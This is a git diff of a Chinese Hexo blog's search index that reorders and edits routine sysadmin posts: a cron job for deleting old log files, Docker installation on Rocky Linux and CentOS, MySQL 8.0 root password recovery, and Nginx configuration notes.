-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date -s 23:59:50</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/renshengdezheli/p/13941084.html">Linux文件的三个时间</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL基础</title>
     <url>/2024/1003155441.html</url>
     <content><![CDATA[<h2 id="数据库相关概念"><a href="#数据库相关概念" class="headerlink" title="数据库相关概念"></a>数据库相关概念</h2><ul>
@@ -8356,65 +8326,33 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
       </tags>
   </entry>
   <entry>
-    <title>Docker安装教程</title>
-    <url>/2024/1017195632.html</url>
-    <content><![CDATA[<h1 id="在Rocky-Linux-9上安装Docker"><a href="#在Rocky-Linux-9上安装Docker" class="headerlink" title="在Rocky Linux 9上安装Docker"></a>在Rocky Linux 9上安装Docker</h1><h2 id="添加docker-repo-更新源-安装docker-ce"><a href="#添加docker-repo-更新源-安装docker-ce" class="headerlink" title="添加docker repo, 更新源, 安装docker-ce"></a>添加docker repo, 更新源, 安装docker-ce</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf config-manager --add-repo=https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">dnf update</span><br><span class="line">dnf install -y docker-ce</span><br></pre></td></tr></table></figure>
+    <title>Linux中定时删除10天前的日志文件</title>
+    <url>/2024/1009194730.html</url>
+    <content><![CDATA[<p>例如：删除&#x2F;data&#x2F;log&#x2F;目录下所有10天前的.log文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /data/log/ -type f -name &quot;*.log&quot; -mtime +10 -exec rm -f &#123;&#125; \;</span><br></pre></td></tr></table></figure>
 
-<h2 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
-
+<p>只查看要删除的文件有哪些，不真正删除文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logfiles=$(find /data/log/ -type f -name &quot;*.log&quot; -mtime +10)</span><br><span class="line">echo $logfiles</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
 
-<h2 id="查看docker版本"><a href="#查看docker版本" class="headerlink" title="查看docker版本"></a>查看docker版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           27.3.1</span><br></pre></td></tr></table></figure>
+<p>使用crontab添加一个定时任务，每天0点执行一次删除任务</p>
+<p>先写个脚本<code>delete_old_logfile.sh</code>删除10天前日志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/sbin/:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">logfiles=$(find /data/log/ -<span class="built_in">type</span> f -name <span class="string">&quot;*.log&quot;</span> -mtime +10)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$&#123;logfiles&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    find /data/log/ -<span class="built_in">type</span> f -name <span class="string">&quot;*.log&quot;</span> -mtime +10 -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Delete old logfiles: <span class="variable">$&#123;logfiles&#125;</span>, ret: $?&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+<p>再配置crontab</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;0 0 * * * (cd /path/to; delete_old_logfile.sh)&#x27; &gt;&gt; /var/spool/cron/root</span><br></pre></td></tr></table></figure>
 
-<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull rockylinux:9.3</span><br></pre></td></tr></table></figure>
+<h2 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h2><p>在&#x2F;data&#x2F;log目录下手动创建几个.log文件，用touch命令把文件的mtime改到10天前</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch -m -d &quot;1999-01-01 00:00:00&quot; /data/log/*.log</span><br></pre></td></tr></table></figure>
+<p>手动修改系统时间到23:59:50, 观察0点钟crontab定时任务是否执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date -s 23:59:50</span><br></pre></td></tr></table></figure>
 
-<h1 id="在Centos7上安装Docker"><a href="#在Centos7上安装Docker" class="headerlink" title="在Centos7上安装Docker"></a>在Centos7上安装Docker</h1><h2 id="移除旧版本Docker"><a href="#移除旧版本Docker" class="headerlink" title="移除旧版本Docker"></a>移除旧版本Docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure>
-
-<h2 id="添加Docker存储库"><a href="#添加Docker存储库" class="headerlink" title="添加Docker存储库"></a>添加Docker存储库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
-<h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
-
-<h2 id="启动Docker服务"><a href="#启动Docker服务" class="headerlink" title="启动Docker服务"></a>启动Docker服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
-
-<h2 id="查看Docker版本"><a href="#查看Docker版本" class="headerlink" title="查看Docker版本"></a>查看Docker版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker --version</span><br><span class="line">Docker version 25.0.2, build 29cf629</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.rockylinux.cn/notes/zai-rocky-linux-9-1-shang-an-zhuang-docker-ce.html">https://www.rockylinux.cn/notes/zai-rocky-linux-9-1-shang-an-zhuang-docker-ce.html</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/renshengdezheli/p/13941084.html">Linux文件的三个时间</a></p>
 ]]></content>
       <categories>
-        <category>Docker</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL8.0如何重置密码</title>
-    <url>/2024/1017202436.html</url>
-    <content><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
-<li>VMware Rocky Linux 9.4</li>
-<li>MySQL 8.0.36</li>
-</ul>
-<h2 id="修改MySQL配置文件-设置为免密登录"><a href="#修改MySQL配置文件-设置为免密登录" class="headerlink" title="修改MySQL配置文件, 设置为免密登录"></a>修改MySQL配置文件, 设置为免密登录</h2><p>修改<code>/etc/my.cnf.d/mysql-server.cnf</code>, 在[mysqld]结尾添加一行<code>skip-grant-tables</code></p>
-<span id="more"></span>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line">log-error=/var/log/mysql/mysqld.log</span><br><span class="line">pid-file=/run/mysqld/mysqld.pid</span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>
-
-<h2 id="重启MySQL服务"><a href="#重启MySQL服务" class="headerlink" title="重启MySQL服务"></a>重启MySQL服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure>
-
-<h2 id="连接MySQL，修改密码"><a href="#连接MySQL，修改密码" class="headerlink" title="连接MySQL，修改密码"></a>连接MySQL，修改密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>
-<p>连接成功后，执行如下sql命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">flush privileges;</span><br><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;your_new_password&#x27;;</span><br><span class="line">grant all privileges on *.* to &quot;root&quot;@&#x27;localhost&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
-
-<h2 id="还原配置文件并重启MySQL服务"><a href="#还原配置文件并重启MySQL服务" class="headerlink" title="还原配置文件并重启MySQL服务"></a>还原配置文件并重启MySQL服务</h2><p>修改<code>/etc/my.cnf.d/mysql-server.cnf</code>, 删掉开头加的<code>skip-grant-tables</code>，再重启服务即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/Box_clf/article/details/124599166">https://blog.csdn.net/Box_clf&#x2F;article&#x2F;details&#x2F;124599166</a><br><a href="https://blog.namichong.com/learn/sql/mysql/mysql_8.0_reset_password.html">https://blog.namichong.com/learn/sql/mysql/mysql_8.0_reset_password.html</a></p>
-]]></content>
-      <categories>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -9142,6 +9080,68 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
       </tags>
   </entry>
   <entry>
+    <title>Docker安装教程</title>
+    <url>/2024/1017195632.html</url>
+    <content><![CDATA[<h1 id="在Rocky-Linux-9上安装Docker"><a href="#在Rocky-Linux-9上安装Docker" class="headerlink" title="在Rocky Linux 9上安装Docker"></a>在Rocky Linux 9上安装Docker</h1><h2 id="添加docker-repo-更新源-安装docker-ce"><a href="#添加docker-repo-更新源-安装docker-ce" class="headerlink" title="添加docker repo, 更新源, 安装docker-ce"></a>添加docker repo, 更新源, 安装docker-ce</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf config-manager --add-repo=https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">dnf update</span><br><span class="line">dnf install -y docker-ce</span><br></pre></td></tr></table></figure>
+
+<h2 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h2 id="查看docker版本"><a href="#查看docker版本" class="headerlink" title="查看docker版本"></a>查看docker版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           27.3.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull rockylinux:9.3</span><br></pre></td></tr></table></figure>
+
+<h1 id="在Centos7上安装Docker"><a href="#在Centos7上安装Docker" class="headerlink" title="在Centos7上安装Docker"></a>在Centos7上安装Docker</h1><h2 id="移除旧版本Docker"><a href="#移除旧版本Docker" class="headerlink" title="移除旧版本Docker"></a>移除旧版本Docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine</span><br></pre></td></tr></table></figure>
+
+<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure>
+
+<h2 id="添加Docker存储库"><a href="#添加Docker存储库" class="headerlink" title="添加Docker存储库"></a>添加Docker存储库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
+<h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
+
+<h2 id="启动Docker服务"><a href="#启动Docker服务" class="headerlink" title="启动Docker服务"></a>启动Docker服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看Docker版本"><a href="#查看Docker版本" class="headerlink" title="查看Docker版本"></a>查看Docker版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker --version</span><br><span class="line">Docker version 25.0.2, build 29cf629</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.rockylinux.cn/notes/zai-rocky-linux-9-1-shang-an-zhuang-docker-ce.html">https://www.rockylinux.cn/notes/zai-rocky-linux-9-1-shang-an-zhuang-docker-ce.html</a></p>
+]]></content>
+      <categories>
+        <category>Docker</category>
+      </categories>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL8.0如何重置密码</title>
+    <url>/2024/1017202436.html</url>
+    <content><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
+<li>VMware Rocky Linux 9.4</li>
+<li>MySQL 8.0.36</li>
+</ul>
+<h2 id="修改MySQL配置文件-设置为免密登录"><a href="#修改MySQL配置文件-设置为免密登录" class="headerlink" title="修改MySQL配置文件, 设置为免密登录"></a>修改MySQL配置文件, 设置为免密登录</h2><p>修改<code>/etc/my.cnf.d/mysql-server.cnf</code>, 在[mysqld]结尾添加一行<code>skip-grant-tables</code></p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line">log-error=/var/log/mysql/mysqld.log</span><br><span class="line">pid-file=/run/mysqld/mysqld.pid</span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>
+
+<h2 id="重启MySQL服务"><a href="#重启MySQL服务" class="headerlink" title="重启MySQL服务"></a>重启MySQL服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure>
+
+<h2 id="连接MySQL，修改密码"><a href="#连接MySQL，修改密码" class="headerlink" title="连接MySQL，修改密码"></a>连接MySQL，修改密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>
+<p>连接成功后，执行如下sql命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">flush privileges;</span><br><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;your_new_password&#x27;;</span><br><span class="line">grant all privileges on *.* to &quot;root&quot;@&#x27;localhost&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<h2 id="还原配置文件并重启MySQL服务"><a href="#还原配置文件并重启MySQL服务" class="headerlink" title="还原配置文件并重启MySQL服务"></a>还原配置文件并重启MySQL服务</h2><p>修改<code>/etc/my.cnf.d/mysql-server.cnf</code>, 删掉开头加的<code>skip-grant-tables</code>，再重启服务即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/Box_clf/article/details/124599166">https://blog.csdn.net/Box_clf&#x2F;article&#x2F;details&#x2F;124599166</a><br><a href="https://blog.namichong.com/learn/sql/mysql/mysql_8.0_reset_password.html">https://blog.namichong.com/learn/sql/mysql/mysql_8.0_reset_password.html</a></p>
+]]></content>
+      <categories>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>在Docker中运行Squid</title>
     <url>/2024/1017195435.html</url>
     <content><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>VMware Rocky Linux 9.4</p>
@@ -9509,8 +9509,7 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
   <entry>
     <title>Nginx入门</title>
     <url>/2024/1109151034.html</url>
-    <content><![CDATA[<p><a href="https://wiki.wgpsec.org/knowledge/web/same-origin-policy.html">https://wiki.wgpsec.org/knowledge/web/same-origin-policy.html</a></p>
-<h1 id="Nginx简介"><a href="#Nginx简介" class="headerlink" title="Nginx简介"></a>Nginx简介</h1><p>高性能的web服务器, 反向代理服务器, 负载均衡器, HTTP缓存</p>
+    <content><![CDATA[<h1 id="Nginx简介"><a href="#Nginx简介" class="headerlink" title="Nginx简介"></a>Nginx简介</h1><p>高性能的web服务器, 反向代理服务器, 负载均衡器, HTTP缓存</p>
 <h1 id="竞品"><a href="#竞品" class="headerlink" title="竞品"></a>竞品</h1><ul>
 <li>Apache - 老牌Web服务器, 重量级, 高并发差</li>
 <li>Lighttpd - 轻量级,高性能Web</li>
@@ -9546,34 +9545,19 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
 <h2 id="Nginx-Location配置"><a href="#Nginx-Location配置" class="headerlink" title="Nginx Location配置"></a>Nginx Location配置</h2><p><a href="https://pcj600.github.io/2024/1117141829.html">https://pcj600.github.io/2024/1117141829.html</a></p>
 <h2 id="负载均衡-反向代理"><a href="#负载均衡-反向代理" class="headerlink" title="负载均衡&#x2F;反向代理"></a>负载均衡&#x2F;反向代理</h2><p><a href="http://pcj600.github.io/2024/1117165553.html">http://pcj600.github.io/2024/1117165553.html</a></p>
 <h2 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h2><p><a href="https://pcj600.github.io/2024/1119221949.html">https://pcj600.github.io/2024/1119221949.html</a></p>
-<h1 id="静态资源防盗链-TODO"><a href="#静态资源防盗链-TODO" class="headerlink" title="静态资源防盗链(TODO)"></a>静态资源防盗链(TODO)</h1><p>资源盗链指内容不在自己服务器，而是通过技术手段，绕过别人限制将别人内容放到自己页面上最终显示给用户，盗取大网站流量，用别人的资源搭自己网站</p>
-<p>HTTP Header Referer</p>
-<p>浏览器向web请求时，一般会带上referer，来告诉浏览器此网页是从哪个链接跳转过来的<br>后台服务器可以根据Referer判断自己是否为受信任的网站，如果是则放行，不是可以拒绝访问<br><a href="https://www.bilibili.com/video/BV1ov41187bq?vd_source=d8559c2d87607be86810cd806158bb86&spm_id_from=333.788.player.switch&p=65">https://www.bilibili.com/video/BV1ov41187bq?vd_source=d8559c2d87607be86810cd806158bb86&amp;spm_id_from=333.788.player.switch&amp;p=65</a><br>直接访问可以，通过XX页面访问不行</p>
-<p>更精细的控制: Nginx第三方模块ngx_http_accesskey_module</p>
-<span id="more"></span>
-
-
-
-<h1 id="Nginx进程间的关系"><a href="#Nginx进程间的关系" class="headerlink" title="Nginx进程间的关系"></a>Nginx进程间的关系</h1><p>一个master进程管理多个worker进程, worker进程数和CPU核心数相等</p>
-<h1 id="Nginx主配置文件"><a href="#Nginx主配置文件" class="headerlink" title="Nginx主配置文件"></a>Nginx主配置文件</h1><p>主配置文件<code>/etc/nginx/nginx.conf</code>, 基础配置说明如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user nginx;                               # 以Nginx用户启动</span><br><span class="line">worker_processes auto;                    # work process进程的个数</span><br><span class="line">error_log /var/log/nginx/error.log;       # 错误日志路径</span><br><span class="line">pid /run/nginx.pid; </span><br><span class="line"></span><br><span class="line">include /usr/share/nginx/modules/*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;              # 单个进程可接收连接数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile            on;</span><br><span class="line">    tcp_nopush          on;</span><br><span class="line">    tcp_nodelay         on;</span><br><span class="line">    keepalive_timeout   65;</span><br><span class="line">    types_hash_max_size 4096;</span><br><span class="line"></span><br><span class="line">    include             /etc/nginx/mime.types;		# 服务器发送MIME type给客户端，让客户端知道请求的文件类型</span><br><span class="line">    default_type        application/octet-stream;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;							# LISTEN端口</span><br><span class="line">        listen       [::]:80;</span><br><span class="line">        server_name  _;								# 主机名</span><br><span class="line">        root         /usr/share/nginx/html;			# 在哪里找页面</span><br><span class="line"></span><br><span class="line">        # Load configuration files for the default server block.</span><br><span class="line">        include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">        location = /404.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page 500 502 503 504 /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="基于域名的几种互联网需求解析"><a href="#基于域名的几种互联网需求解析" class="headerlink" title="基于域名的几种互联网需求解析"></a>基于域名的几种互联网需求解析</h1><p>补充: hosts泛解析 <a href="https://cloud.tencent.com/developer/article/1534150">https://cloud.tencent.com/developer/article/1534150</a> (dnsmaxq) 本机DNS指向dnsmasq,dnsmasq做泛解析，把域名都解析到同一个IP</p>
-<h2 id="多用户二级域名需求-微博"><a href="#多用户二级域名需求-微博" class="headerlink" title="多用户二级域名需求(微博)"></a>多用户二级域名需求(微博)</h2><p>*.weibo.com -&gt; Nginx -&gt; 真正的业务服务器(拿到域名，解析出二级域名)</p>
-<h2 id="短网址"><a href="#短网址" class="headerlink" title="短网址"></a>短网址</h2><p>*.com&#x2F;asdasjda12312 -&gt; Nginx -&gt; 真正的网址</p>
-<h1 id="Nginx浏览器缓存的概念"><a href="#Nginx浏览器缓存的概念" class="headerlink" title="Nginx浏览器缓存的概念"></a>Nginx浏览器缓存的概念</h1><p>web缓存种类:</p>
+<h2 id="Nginx-keepalived高可用"><a href="#Nginx-keepalived高可用" class="headerlink" title="Nginx+keepalived高可用"></a>Nginx+keepalived高可用</h2><p><a href="https://pcj600.github.io/2024/1123135607.html">https://pcj600.github.io/2024/1123135607.html</a></p>
+<h2 id="Nginx-URLRewrite"><a href="#Nginx-URLRewrite" class="headerlink" title="Nginx URLRewrite"></a>Nginx URLRewrite</h2><p><a href="https://pcj600.github.io/2024/1123152532.html">https://pcj600.github.io/2024/1123152532.html</a></p>
+<h2 id="Nginx缓存"><a href="#Nginx缓存" class="headerlink" title="Nginx缓存"></a>Nginx缓存</h2><p>web缓存种类:</p>
 <ul>
 <li>客户端缓存(浏览器缓存)</li>
-<li>服务端缓存(Nginx&#x2F;Redis&#x2F;Memcached)</li>
+<li>服务端缓存(Nginx&#x2F;Redis&#x2F;Memcached)<br>为了节约网络资源加速浏览，对用户最近请求过文档进行存储，再次请求这个页面时，浏览器就可以从本地磁盘显示文档，加速浏览。</li>
 </ul>
-<p>为了节约网络资源加速浏览，对用户最近请求过文档进行存储，再次请求这个页面时，浏览器就可以从本地磁盘显示文档，加速浏览。</p>
-<h1 id="HTTP协议中与缓存相关的Header"><a href="#HTTP协议中与缓存相关的Header" class="headerlink" title="HTTP协议中与缓存相关的Header"></a>HTTP协议中与缓存相关的Header</h1><p>Expires: 缓存过期的日期和时间<br>Cache-Control: 设置和缓存相关的配置信息<br>Last-Modified: 请求资源最后修改时间(服务端的时间)<br>ETag: 请求变量的实体标签的当前值，例如MD5<br><a href="https://cloud.tencent.com/developer/article/2264687">https://cloud.tencent.com/developer/article/2264687</a><br><a href="https://harttle.land/2017/04/04/using-http-cache.html">https://harttle.land/2017/04/04/using-http-cache.html</a><br><a href="https://blog.csdn.net/sunny_day_day/article/details/107993349">https://blog.csdn.net/sunny_day_day/article/details/107993349</a></p>
-<p>Etag重要性 <a href="https://www.cnblogs.com/52linux/archive/2012/04/26/2470865.html">https://www.cnblogs.com/52linux/archive/2012/04/26/2470865.html</a><br><img data-src="/"></p>
+<h3 id="HTTP协议中与缓存相关的Header"><a href="#HTTP协议中与缓存相关的Header" class="headerlink" title="HTTP协议中与缓存相关的Header"></a>HTTP协议中与缓存相关的Header</h3><p>Expires: 缓存过期的日期和时间<br>Cache-Control: 设置和缓存相关的配置信息<br>Last-Modified: 请求资源最后修改时间(服务端的时间)<br>ETag: 请求变量的实体标签的当前值，例如MD5<br><a href="https://cloud.tencent.com/developer/article/2264687">https://cloud.tencent.com/developer/article/2264687</a><br><a href="https://harttle.land/2017/04/04/using-http-cache.html">https://harttle.land/2017/04/04/using-http-cache.html</a><br><a href="https://blog.csdn.net/sunny_day_day/article/details/107993349">https://blog.csdn.net/sunny_day_day/article/details/107993349</a><br><a href="https://www.cnblogs.com/52linux/archive/2012/04/26/2470865.html">https://www.cnblogs.com/52linux/archive/2012/04/26/2470865.html</a></p>
 <ul>
 <li>强缓存(直接取本地，不发请求到后端)</li>
 <li>弱缓存(问一下后端，后端判断无变化，返回304)</li>
 </ul>
-<h1 id="Nginx缓存设置-TODO"><a href="#Nginx缓存设置-TODO" class="headerlink" title="Nginx缓存设置(TODO)"></a>Nginx缓存设置(TODO)</h1><p>expires指令<br>控制HTTP应答中的”Expires”(1.0的配置，问题是服务端时间和客户端时间存在不一致)和”Cache-Control”</p>
+<h3 id="Nginx缓存设置-TODO"><a href="#Nginx缓存设置-TODO" class="headerlink" title="Nginx缓存设置(TODO)"></a>Nginx缓存设置(TODO)</h3><p>expires指令<br>控制HTTP应答中的”Expires”(1.0的配置，问题是服务端时间和客户端时间存在不一致)和”Cache-Control”</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">expires [modified] time </span><br><span class="line">expires epoch | max | off</span><br></pre></td></tr></table></figure>
 <p>no-cache弱缓存</p>
 <ul>
@@ -9582,45 +9566,20 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
 <li>max指定Expires的值’31 December 2037 23:59:59 GMT’, Cache-Control值为10年</li>
 <li>off默认不缓存</li>
 </ul>
-<h1 id="动静分离"><a href="#动静分离" class="headerlink" title="动静分离"></a>动静分离</h1><p>TODO</p>
-<h1 id="URLReWrite"><a href="#URLReWrite" class="headerlink" title="URLReWrite"></a>URLReWrite</h1><p>Rewrite是Nginx提供的一个重要基本功能，用于实现URL的重写<br>URLReWrite依赖于PCRE支持，在编译安装Nginx之前，需要安装PCRE库<br>Nginx使用ngx_http_rewrite_module模块解析并处理Rewrite</p>
-<p>官方文档: <a href="http://nginx.org/en/docs/http/ngx_http_rewrite_module.html">http://nginx.org/en/docs/http/ngx_http_rewrite_module.html</a></p>
-<h2 id="URLReWrite的应用场景"><a href="#URLReWrite的应用场景" class="headerlink" title="URLReWrite的应用场景"></a>URLReWrite的应用场景</h2><p>域名跳转<br>域名镜像<br>独立域名<br>目录自动添加<br>合并目录<br>防盗链的实现</p>
-<h2 id="域名跳转"><a href="#域名跳转" class="headerlink" title="域名跳转"></a>域名跳转</h2><p>例: 访问<a href="http://www.360buy.com/">www.360buy.com</a> <a href="http://www.jingdong.com/">www.jingdong.com</a> -&gt; 最终跳转到<a href="http://www.jd.com/">www.jd.com</a></p>
-<p>准备三个域名，修改hosts文件<br>vim &#x2F;etc&#x2F;hosts</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.200 www.petertest1.cn</span><br><span class="line">192.168.52.200 www.petertest2.cn</span><br><span class="line">192.168.52.200 www.peter.com</span><br></pre></td></tr></table></figure>
-<p>配置Nginx, 访问<a href="http://www.peter.com/">www.peter.com</a>, 返回主页</p>
